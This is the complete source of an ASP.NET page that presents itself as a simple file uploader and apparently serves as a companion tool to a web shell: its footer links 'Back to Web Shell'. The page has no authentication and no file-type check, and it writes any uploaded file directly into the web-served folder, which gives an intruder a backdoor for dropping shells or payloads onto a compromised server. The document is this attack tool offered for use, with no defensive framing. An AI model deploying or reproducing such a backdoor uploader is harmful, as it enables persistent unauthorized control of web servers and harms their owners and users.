<%@ Page Language="C#" %>
<html>
<head>
    <title>ASP.NET Uploader</title>
    <style>body{font-family:monospace; background:#111; color:#0f0; padding:20px;}</style>
</head>
<body>
    <h2>Simple ASP.NET File Uploader</h2>
    
    <form method="post" enctype="multipart/form-data" runat="server">
        <asp:FileUpload ID="FileUpload1" runat="server" />
        <asp:Button ID="UploadButton" runat="server" Text="Upload File" OnClick="UploadButton_Click" />
        <br /><br />
        <asp:Label ID="StatusLabel" runat="server" Text="" ForeColor="Yellow"></asp:Label>
    </form>

    <script runat="server">
        protected void UploadButton_Click(object sender, EventArgs e)
        {
            if (FileUpload1.HasFile)
            {
                try
                {
                    string filename = System.IO.Path.GetFileName(FileUpload1.FileName);
                    string savePath = Server.MapPath("./") + filename;   // current folder mein save hoga
                    
                    FileUpload1.SaveAs(savePath);
                    StatusLabel.Text = "✅ Upload Successful: " + filename;
                }
                catch (Exception ex)
                {
                    StatusLabel.Text = "❌ Error: " + ex.Message;
                }
            }
            else
            {
                StatusLabel.Text = "No file selected.";
            }
        }
    </script>

    <hr>
    <a href="your_shell.asp">Back to Web Shell</a>
</body>
</html>
